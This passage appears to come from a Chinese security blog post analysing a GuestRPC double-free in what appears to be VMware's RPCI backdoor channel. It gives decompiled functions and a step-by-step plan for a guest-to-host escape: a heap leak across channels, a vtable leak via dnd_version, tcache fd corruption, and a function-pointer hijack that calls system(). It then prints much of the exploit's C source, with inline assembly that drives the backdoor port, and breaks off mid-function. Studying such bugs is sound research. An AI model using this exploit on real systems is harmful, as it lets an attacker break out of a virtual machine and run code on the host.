a3)</span><br>&#123;<br>  <span class="hljs-type">void</span> *v4; <span class="hljs-comment">// rdi</span><br><br>  v4 = *(<span class="hljs-type">void</span> **)(a1 + <span class="hljs-number">8</span>);<br>  <span class="hljs-keyword">if</span> ( (a3 &amp; <span class="hljs-number">0x20</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(v4);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( (a3 &amp; <span class="hljs-number">0x10</span>) == <span class="hljs-number">0</span> )<br>  &#123;<br>    sub_176D90(a1, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)(a1 + <span class="hljs-number">32</span>) )<br>    &#123;<br>      sub_55A0E0(<span class="hljs-string">&quot;GuestRpc: Closing RPCI backdoor channel %u after send completion\n&quot;</span>, a2);<br>      sub_189FE0(a2);<br>      *(_BYTE *)(a1 + <span class="hljs-number">32</span>) = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里有一个if分支是free掉a1+8位置的buf，要求是a3 and 0x20!&#x3D;0，这就刚好和patch的地方相符合，这里会导致一次free。</p>
+<p>此处释放的缓冲区是偏移为8的地方的缓冲区，该缓冲区对应于内部用于存储传递回用户的回复数据的缓冲区。</p>
+<p>同时在switch&#x3D;6的时候，此处会再次释放，这就导致了DF存在，而在这个DF的中间，重复使用该区域，可以利用为UAF。</p>
+<p>下面就有了基本的思路</p>
+<ul>
+<li>leak</li>
+<li>更改tcache的fd</li>
+<li>获取<code>rip</code>控制<code>rdi</code>调用<code>system(&quot;/usr/bin/xcalc &amp;&quot;)</code></li>
+</ul>
+<p>在此guestrpc的区间内，对堆的操作非常少，所以该漏洞利用也是比较稳固的。</p>
+<h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>leak操作利用的是比较老套的uaf利用</p>
+<ul>
+<li>分配三个通道 [A]、[B] 和 [C]</li>
+<li>将命令发送<code>info-set</code>到通道 [A]</li>
+<li>打开通道 [B] 并发出 a <code>info-get</code>以检索我们刚刚设置的数据</li>
+<li>在通道 [B] 上发出回复长度和回复读取命令</li>
+<li>在通道 [B] 上调用错误的 finalize 命令，释放底层的回复缓冲区</li>
+<li>在通道 [C] 上调用<code>info-get</code>并接收回复长度，它在我们刚刚分配的同一地址分配一个缓冲区</li>
+<li>关闭通道 [B]，再次释放缓冲区</li>
+<li>阅读频道[C]上的回复以泄露我们的数据</li>
+</ul>
+<p>但是在channel C上形成的uaf，却并不能做到在tcache中泄露想要的glibc地址，所以在此基础上还需要往C中填入一些可以利用的地址。</p>
+<p>这时候考虑到2017年的一个cve，通过dnd_version造成vtable的leak。</p>
+<p>分析dnd_version如下。ida中搜索<code>vmx.capability.dnd_version</code>，找到对应的bind函数。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3f065bd71745da225b1c04c4a6d034e89f421c8.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>其他的RPC命令类似，在发送“vmx.capability.dnd_version”命令的时候，对应的处理函数中如果发现当前版本和设置的版本不一致，就会调用函数创建新的 object，把原来的版本的object销毁。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_1116D0</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3, <span class="hljs-type">int</span> a4, __int64 reply, __int64 reply_len)</span><br>&#123;<br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// er12</span><br>  __int64 v9; <span class="hljs-comment">// rax</span><br>  __int64 v10; <span class="hljs-comment">// rsi</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [rsp+8h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">int</span> v13[<span class="hljs-number">11</span>]; <span class="hljs-comment">// [rsp+Ch] [rbp-2Ch] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( !a4 )<br>    <span class="hljs-keyword">return</span> set_reply(reply, reply_len, <span class="hljs-string">&quot;1 argument expected&quot;</span>);<br>  v12 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)sub_5611D0(v13, &amp;v12, a3, <span class="hljs-string">&quot; &quot;</span>) )<br>    <span class="hljs-keyword">return</span> set_reply(reply, reply_len, <span class="hljs-string">&quot;Non-integer argument&quot;</span>);<br>  v8 = v13[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">if</span> ( v13[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">return</span> set_reply(reply, reply_len, <span class="hljs-string">&quot;Invalid protocol version.&quot;</span>);<br>  sub_171460(*(_QWORD *)(theCurrentVM + <span class="hljs-number">104LL</span>));<br>  v9 = sub_4723A0(*(_QWORD *)(theCurrentVM + <span class="hljs-number">104LL</span>));<br>  <span class="hljs-keyword">if</span> ( v8 == *(_DWORD *)(v9 + <span class="hljs-number">360</span>) )<br>  &#123;<br>    v10 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_DWORD *)(v9 + <span class="hljs-number">360</span>) = v8;<br>    v10 = <span class="hljs-number">1LL</span>;<br>  &#125;<br>  sub_472380(v9, v10);<br>  sub_1711E0(*(_QWORD *)(theCurrentVM + <span class="hljs-number">104LL</span>));<br>  <span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)sub_12FA20((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v13[<span class="hljs-number">0</span>]) )<br>    <span class="hljs-keyword">return</span> set_reply(reply, reply_len, <span class="hljs-string">&quot;Failed to set VMDB&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v13[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">2</span> )<br>    Tools_SetGuestDnDCapable(<span class="hljs-string">&quot;1&quot;</span>);<br>  <span class="hljs-keyword">return</span> set_reply(reply, reply_len, <span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>传入一个参数代表版本，如果不符合则销毁之前的结构体，创建一个新的结构体。更新在<code>vmx.capability.dnd_version</code>也有对应实现。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bb838684db02dce7205e00d839ff208fed7e2264.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>追踪函数</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6bea8ffd78640f22c86266f875cf6f17ba55736.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-028a1df016d78ca5454c36d7bdd28d0c504175cb.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>那么可以猜到新的结构体大小总是为0xa8。可以通过该方法，控制buf的大小为0xa8，销毁原来的object获得新的object的时候，把channel B的UAF chunk申请出来，然后利用channel C leak libc基址。</p>
+<p>有了leak，利用起来就简单了，直接改fd，然后劫持到bss段，改掉某一个函数指针为system即可。</p>
+<p>新的leak方式如下</p>
+<ul>
+<li>开启channel A和channel B</li>
+<li>A的输出缓冲区为bufA,A利用漏洞free bufA</li>
+<li>然后B给guest发送out put，这时候控制B的buf大小和A一样，此时free的A再次被malloc出来</li>
+<li>释放A，同时buf A被再次释放，此时调用<code>vmx.capability.dnd_version</code>，虚表在此时被写入bufB</li>
+<li>leak出process base 然后根据偏移即可计算出system 以及一些函数指针的地址。</li>
+</ul>
+<p>最后以相同的方式，劫持fd即可,下面的exp是长亭师傅的，根据通信原理实现了一套通信机制，具体内容看参考，不赘述。</p>
+<p>exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">channel_open</span><span class="hljs-params">(<span class="hljs-type">int</span> *cookie1,<span class="hljs-type">int</span> *cookie2,<span class="hljs-type">int</span> *channel_num,<span class="hljs-type">int</span> *res)</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%eax,%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rdi,%%r10\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rsi,%%r11\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rdx,%%r12\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rcx,%%r13\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x564d5868,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0xc9435052,%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x1e,%%ecx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x5658,%%edx\n\t&quot;</span><br>        <span class="hljs-string">&quot;out %%eax,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%edi,(%%r10)\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%esi,(%%r11)\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%edx,(%%r12)\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,(%%r13)\n\t&quot;</span><br>        :<br>        :<br>        :<span class="hljs-string">&quot;%rax&quot;</span>,<span class="hljs-string">&quot;%rbx&quot;</span>,<span class="hljs-string">&quot;%rcx&quot;</span>,<span class="hljs-string">&quot;%rdx&quot;</span>,<span class="hljs-string">&quot;%rsi&quot;</span>,<span class="hljs-string">&quot;%rdi&quot;</span>,<span class="hljs-string">&quot;%r8&quot;</span>,<span class="hljs-string">&quot;%r10&quot;</span>,<span class="hljs-string">&quot;%r11&quot;</span>,<span class="hljs-string">&quot;%r12&quot;</span>,<span class="hljs-string">&quot;%r13&quot;</span><br>       );<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">channel_set_len</span><span class="hljs-params">(<span class="hljs-type">int</span> cookie1,<span class="hljs-type">int</span> cookie2,<span class="hljs-type">int</span> channel_num,<span class="hljs-type">int</span> len,<span class="hljs-type">int</span> *res)</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%eax,%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%r8,%%r10\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x564d5868,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x0001001e,%%ecx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movw $0x5658,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;out %%eax,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,(%%r10)\n\t&quot;</span><br>        :<br>        :<br>        :<span class="hljs-string">&quot;%rax&quot;</span>,<span class="hljs-string">&quot;%rbx&quot;</span>,<span class="hljs-string">&quot;%rcx&quot;</span>,<span class="hljs-string">&quot;%rdx&quot;</span>,<span class="hljs-string">&quot;%rsi&quot;</span>,<span class="hljs-string">&quot;%rdi&quot;</span>,<span class="hljs-string">&quot;%r10&quot;</span><br>       );<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">channel_send_data</span><span class="hljs-params">(<span class="hljs-type">int</span> cookie1,<span class="hljs-type">int</span> cookie2,<span class="hljs-type">int</span> channel_num,<span class="hljs-type">int</span> len,<span class="hljs-type">char</span> *data,<span class="hljs-type">int</span> *res)</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;pushq %%rbp\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%r9,%%r10\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%r8,%%rbp\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rcx,%%r11\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq $0,%%r12\n\t&quot;</span><br>        <span class="hljs-string">&quot;1:\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%r8,%%rbp\n\t&quot;</span><br>        <span class="hljs-string">&quot;add %%r12,%%rbp\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl (%%rbp),%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x564d5868,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x0002001e,%%ecx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movw $0x5658,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;out %%eax,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;addq $4,%%r12\n\t&quot;</span><br>        <span class="hljs-string">&quot;cmpq %%r12,%%r11\n\t&quot;</span><br>        <span class="hljs-string">&quot;ja 1b\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,(%%r10)\n\t&quot;</span><br>        <span class="hljs-string">&quot;popq %%rbp\n\t&quot;</span><br>        :<br>        :<br>        :<span class="hljs-string">&quot;%rax&quot;</span>,<span class="hljs-string">&quot;%rbx&quot;</span>,<span class="hljs-string">&quot;%rcx&quot;</span>,<span class="hljs-string">&quot;%rdx&quot;</span>,<span class="hljs-string">&quot;%rsi&quot;</span>,<span class="hljs-string">&quot;%rdi&quot;</span>,<span class="hljs-string">&quot;%r10&quot;</span>,<span class="hljs-string">&quot;%r11&quot;</span>,<span class="hljs-string">&quot;%r12&quot;</span><br>        );<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">channel_recv_reply_len</span><span class="hljs-params">(<span class="hljs-type">int</span> cookie1,<span class="hljs-type">int</span> cookie2,<span class="hljs-type">int</span> channel_num,<span class="hljs-type">int</span> *len,<span class="hljs-type">int</span> *res)</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%eax,%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%r8,%%r10\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rcx,%%r11\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x564d5868,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x0003001e,%%ecx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movw $0x5658,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;out %%eax,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,(%%r10)\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ebx,(%%r11)\n\t&quot;</span><br>        :<br>        :<br>        :<span class="hljs-string">&quot;%rax&quot;</span>,<span class="hljs-string">&quot;%rbx&quot;</span>,<span class="hljs-string">&quot;%rcx&quot;</span>,<span class="hljs-string">&quot;%rdx&quot;</span>,<span class="hljs-string">&quot;%rsi&quot;</span>,<span class="hljs-string">&quot;%rdi&quot;</span>,<span class="hljs-string">&quot;%r10&quot;</span>,<span class="hljs-string">&quot;%r11&quot;</span><br>       );<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">channel_recv_data</span><span class="hljs-params">(<span class="hljs-type">int</span> cookie1,<span class="hljs-type">int</span> cookie2,<span class="hljs-type">int</span> channel_num,<span class="hljs-type">int</span> offset,<span class="hljs-type">char</span> *data,<span class="hljs-type">int</span> *res)</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;pushq %%rbp\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%r9,%%r10\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%r8,%%rbp\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rcx,%%r11\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq $1,%%rbx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x564d5868,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x0004001e,%%ecx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movw $0x5658,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;in %%dx,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;add %%r11,%%rbp\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ebx,(%%rbp)\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,(%%r10)\n\t&quot;</span><br>        <span class="hljs-string">&quot;popq %%rbp\n\t&quot;</span><br>        :<br>        :<br>        :<span class="hljs-string">&quot;%rax&quot;</span>,<span class="hljs-string">&quot;%rbx&quot;</span>,<span class="hljs-string">&quot;%rcx&quot;</span>,<span class="hljs-string">&quot;%rdx&quot;</span>,<span class="hljs-string">&quot;%rsi&quot;</span>,<span class="hljs-string">&quot;%rdi&quot;</span>,<span class="hljs-string">&quot;%r10&quot;</span>,<span class="hljs-string">&quot;%r11&quot;</span>,<span class="hljs-string">&quot;%r12&quot;</span><br>       );<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">channel_recv_finish</span><span class="hljs-params">(<span class="hljs-type">int</span> cookie1,<span class="hljs-type">int</span> cookie2,<span class="hljs-type">int</span> channel_num,<span class="hljs-type">int</span> *res)</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%eax,%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rcx,%%r10\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq $0x1,%%rbx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x564d5868,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x0005001e,%%ecx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movw $0x5658,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;out %%eax,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,(%%r10)\n\t&quot;</span><br>        :<br>        :<br>        :<span class="hljs-string">&quot;%rax&quot;</span>,<span class="hljs-string">&quot;%rbx&quot;</span>,<span class="hljs-string">&quot;%rcx&quot;</span>,<span class="hljs-string">&quot;%rdx&quot;</span>,<span class="hljs-string">&quot;%rsi&quot;</span>,<span class="hljs-string">&quot;%rdi&quot;</span>,<span class="hljs-string">&quot;%r10&quot;</span><br>       );<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">channel_recv_finish2</span><span class="hljs-params">(<span class="hljs-type">int</span> cookie1,<span class="hljs-type">int</span> cookie2,<span class="hljs-type">int</span> channel_num,<span class="hljs-type">int</span> *res)</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%eax,%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rcx,%%r10\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq $0x21,%%rbx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x564d5868,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x0005001e,%%ecx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movw $0x5658,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;out %%eax,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,(%%r10)\n\t&quot;</span><br>        :<br>        :<br>        :<span class="hljs-string">&quot;%rax&quot;</span>,<span class="hljs-string">&quot;%rbx&quot;</span>,<span class="hljs-string">&quot;%rcx&quot;</span>,<span class="hljs-string">&quot;%rdx&quot;</span>,<span class="hljs-string">&quot;%rsi&quot;</span>,<span class="hljs-string">&quot;%rdi&quot;</span>,<span class="hljs-string">&quot;%r10&quot;</span><br>       );<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">channel_close</span><span class="hljs-params">(<span class="hljs-type">int</span> cookie1,<span class="hljs-type">int</span> cookie2,<span class="hljs-type">int</span> channel_num,<span 